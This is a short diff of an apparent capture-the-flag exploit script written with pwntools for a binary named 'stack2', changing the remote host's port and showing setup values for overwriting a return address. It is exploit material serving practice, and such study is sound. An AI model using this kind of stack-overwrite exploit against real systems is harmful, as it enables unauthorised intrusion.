@@ -1,6 +1,6 @@
 from pwn import *
 #p = process('./stack2')
-p = remote("111.198.29.45","46344")
+p = remote('111.198.29.45','39900')
 #gdb.attach(p,"b *0x0804868D")
 write_addr = 0xffffd05c
 target_addr = [0x9b,0x85,0x04,0x08]
